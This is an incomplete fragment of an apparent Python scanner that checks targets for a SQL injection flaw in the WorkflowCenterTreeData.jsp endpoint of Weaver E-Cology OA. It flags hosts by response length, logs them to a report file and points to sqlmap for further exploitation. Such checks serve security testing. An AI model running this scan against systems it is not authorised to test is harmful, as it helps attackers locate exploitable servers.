...
filename = "./reps/E_Cology_OA_WorkflowCenterTreeData接口SQL注入-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
...
def ecwtsqli(url):
    ...
    try:
        ...
        if '[' in res.text and res.status_code == 200 and "访问超时" not in res.text:
            re = res.url+"/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
            r = requests.get(re)
            if len(r.text) < 48 and len(r.text) > 0:
                print("\033[0;32;40m[+] 疑似存在E_Cology_OA_WorkflowCenterTreeData接口SQL注入漏洞,可利用sqlmap进行进一步利用: {}！！！\033[0m".format(target))
                f = open(filename, "a+", encoding="utf-8")
                f.write("疑似： ")
                f.write(target)
                f.write("\n")
                f.write("长度：")
                f.write(str(len(r.text)))
                f.write("\n")
                f.close()
            elif len(r.text) < 100 and len(r.text) >=48:
                print("\033[4;33m[?] 可能存在E_Cology_OA_WorkflowCenterTreeData接口SQL注入漏洞,几率甚渺,请手工验证: {}\033[0m".format(target))
                f = open(filename, "a+", encoding="utf-8")
                f.write("几率甚渺： ")
                f.write(target)
                f.write("\n")
                ...
                print("[??] {} 返回文本过大99%为假,未进行文本记录请自行测试 ".format(target))
        else:
            print("\033[0;31;40m[-] {} 未发现E_Cology_OA_WorkflowCenterTreeData接口SQL注入漏洞\033[0m".format(target))
    except:
